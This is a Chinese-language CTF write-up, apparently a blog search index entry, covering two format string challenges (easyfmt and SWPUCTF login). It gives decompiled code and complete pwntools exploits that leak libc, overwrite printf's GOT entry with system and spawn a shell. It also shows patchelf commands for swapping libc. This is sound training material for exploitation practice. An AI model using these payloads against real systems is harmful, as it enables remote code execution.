<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>格式化字符串</title>
    <url>/2024/02/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<p>关于格式化字符串漏洞的题目</p>
<span id="more"></span>
<h2 id="wdb-2018-2nd-easyfmt（格式化字符串-更换可执行文件libc）"><a href="#wdb-2018-2nd-easyfmt（格式化字符串-更换可执行文件libc）" class="headerlink" title="wdb_2018_2nd_easyfmt（格式化字符串+ 更换可执行文件libc）"></a>wdb_2018_2nd_easyfmt（格式化字符串+ 更换可执行文件libc）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know repeater?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>覆写printf的got表（通过格式化字符串）为system地址（ret2libc获得system地址），然后输入binsh</p>
</li>
<li><p>泄露libc基地址：(%6$s)</p>
</li>
</ul>
<p>通过puts函数的got表得出libc_base，（真实地址-偏移）</p>
<p><strong>偏移通过更换程序libc，然后gdb调试得出</strong></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./easyfmt&quot;</span>)</span><br><span class="line">e=ELF(<span class="string">&quot;./easyfmt&quot;</span>)</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;puts_got: &quot;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">printf_got=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload=p32(puts_got)+<span class="string">b&quot;%6$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">puts_ad=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">base=puts_ad-<span class="number">0x5fcb0</span></span><br><span class="line">system_ad=base+<span class="number">0x3adb0</span></span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_ad&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




<h3 id="更换libc"><a href="#更换libc" class="headerlink" title="更换libc"></a>更换libc</h3><ul>
<li>glibc-all-in-one</li>
</ul>
<p><code>./update_list</code></p>
<p><code>cat list</code></p>
<p><code>./download (版本)</code></p>
<ul>
<li>patchelf(以上面easyfmt为例)</li>
</ul>
<p><code>patchelf --set-interpreter /home/nefunsi/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so ./easyfmt</code></p>
<p><code>patchelf --set-rpath /home/nefunsi/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386 ./easyfmt</code></p>
<h2 id="SWPUCTF-2019-login（bss段格式化字符串）"><a href="#SWPUCTF-2019-login（bss段格式化字符串）" class="headerlink" title="SWPUCTF_2019_login（bss段格式化字符串）"></a>SWPUCTF_2019_login（bss段格式化字符串）</h2><p><a href="https://zhuanlan.zhihu.com/p/130271689">深入理解GOT表和PLT表 - 知乎 (zhihu.com)</a></p>
<p><a href="https://saurlax.com/posts/patchelf%E4%B8%8Eglibc-all-in-one%E4%BD%BF%E7%94%A8.html">更换libc</a></p>
<p><code>%hhn</code> 的参数是指向 char 类型变量的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_804B080, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Base maybe not easy......&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_80485E3();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_80485E3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello, %s&quot;</span>, byte_804B080);</span><br><span class="line">  <span class="keyword">return</span> sub_804854B();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_804854B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your password: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[read(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;<span class="comment">//0804B0A0</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;wllmmllw&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the wrong password: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Login successfully! Have fun!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="先将printf-got表写入栈上，再修改printf-got内容为system，然后输入binsh就可以get-shell了"><a href="#先将printf-got表写入栈上，再修改printf-got内容为system，然后输入binsh就可以get-shell了" class="headerlink" title="先将printf_got表写入栈上，再修改printf_got内容为system，然后输入binsh就可以get shell了"></a>先将printf_got表写入栈上，再修改printf_got内容为system，然后输入binsh就可以get shell了</h3><p>栈：$6-&gt;$10-&gt;$14</p>
<p><img src="/img/stack.png"></p>
<ul>
<li>先泄露libc地址（libc用buu提供的）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0xf1</span>-libc.sym[<span class="string">&#x27;_libc_start_main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span>+ <span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system: &#x27;</span>+ <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>然后泄露栈地址（$6处）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$10_addr</span></span><br><span class="line">payload1=<span class="string">b&#x27;%6$p&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack0=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;stack0= &#x27;</span>+ <span class="built_in">hex</span>(stack0))</span><br><span class="line"><span class="comment">#$14_addr</span></span><br><span class="line">payload2=<span class="string">b&#x27;%10$p&#x27;</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;stack1 =&#x27;</span>+ <span class="built_in">hex</span>(stack1))</span><br></pre></td></tr></table></figure>




<ul>
<li>然后将printf的got表写到栈上(0x804b014)</li>
<li>$10写$14指向</li>
<li>改$14-&gt;printf_got</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1=<span class="string">&#x27;%20c%10$hhn&#x27;</span> <span class="comment">#/x14</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">p2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p2)</span><br><span class="line">p3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span> <span class="comment">#/xb0</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p3)</span><br><span class="line"></span><br><span class="line">p4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p4)</span><br><span class="line">p5=<span class="string">&#x27;%4c%10$hhn&#x27;</span> <span class="comment">#/x04</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p5)</span><br><span class="line"></span><br><span class="line">p6=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p6)</span><br><span class="line">p7=<span class="string">&#x27;%8c%10$hhn&#x27;</span><span class="comment">#/x08</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p7)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>然后改$15-&gt;printf_got+1(因为后面必须一次改写为system)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">satck1 +=<span class="number">4</span></span><br><span class="line"></span><br><span class="line">p0=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p0)</span><br><span class="line">p1=<span class="string">&#x27;%21c%10$hhn&#x27;</span> <span class="comment">#/x15</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">p2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p2)</span><br><span class="line">p3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span> <span class="comment">#/xb0</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p3)</span><br><span class="line"></span><br><span class="line">p4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p4)</span><br><span class="line">p5=<span class="string">&#x27;%4c%10$hhn&#x27;</span> <span class="comment">#/x04</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p5)</span><br><span class="line"></span><br><span class="line">p6=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p6)</span><br><span class="line">p7=<span class="string">&#x27;%8c%10$hhn&#x27;</span><span class="comment">#/x08</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p7)</span><br></pre></td></tr></table></figure>



<ul>
<li>恢复$14</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">paylaod3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack1-<span class="number">4</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,paylaod3)</span><br></pre></td></tr></table></figure>



<ul>
<li>最后一次性将printf_got指向system地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((system&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%14$hhn&#x27;</span></span><br><span class="line">payload4+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((system&amp;<span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)-<span class="number">0x10</span>)+<span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,payload4)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./login&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27355</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./buu_libc/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;password: \n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0xf1</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system: &#x27;</span>+ <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#$10_addr</span></span><br><span class="line">payload1=<span class="string">b&#x27;%6$p&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack0=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;stack0= &#x27;</span>+ <span class="built_in">hex</span>(stack0))</span><br><span class="line"><span class="comment">#$14_addr</span></span><br><span class="line">payload2=<span class="string">b&#x27;%10$p&#x27;</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;stack1 =&#x27;</span>+ <span class="built_in">hex</span>(stack1))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p1=<span class="string">&#x27;%20c%10$hhn&#x27;</span> <span class="comment">#/x14</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">p2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p2)</span><br><span class="line">p3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span> <span class="comment">#/xb0</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p3)</span><br><span class="line"></span><br><span class="line">p4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p4)</span><br><span class="line">p5=<span class="string">&#x27;%4c%10$hhn&#x27;</span> <span class="comment">#/x04</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p5)</span><br><span class="line"></span><br><span class="line">p6=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p6)</span><br><span class="line">p7=<span class="string">&#x27;%8c%10$hhn&#x27;</span><span class="comment">#/x08</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p7)</span><br><span class="line"></span><br><span class="line">stack1 +=<span class="number">4</span></span><br><span class="line"></span><br><span class="line">p0=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p0)</span><br><span class="line">p1=<span class="string">&#x27;%21c%10$hhn&#x27;</span> <span class="comment">#/x15</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">p2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p2)</span><br><span class="line">p3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span> <span class="comment">#/xb0</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p3)</span><br><span class="line"></span><br><span class="line">p4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p4)</span><br><span class="line">p5=<span class="string">&#x27;%4c%10$hhn&#x27;</span> <span class="comment">#/x04</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p5)</span><br><span class="line"></span><br><span class="line">p6=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p6)</span><br><span class="line">p7=<span class="string">&#x27;%8c%10$hhn&#x27;</span><span class="comment">#/x08</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p7)</span><br><span class="line"></span><br><span class="line">paylaod3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack1-<span class="number">4</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,paylaod3)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((system&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%14$hhn&#x27;</span></span><br><span class="line">payload4+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((system&amp;<span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)-<span class="number">0x10</span>)+<span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,payload4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;again!\n&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">             </span><br></pre></td></tr></table></figure>

<p>远程打通，但本地没，换过libc了，不太清楚，gdb停在system处退出</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
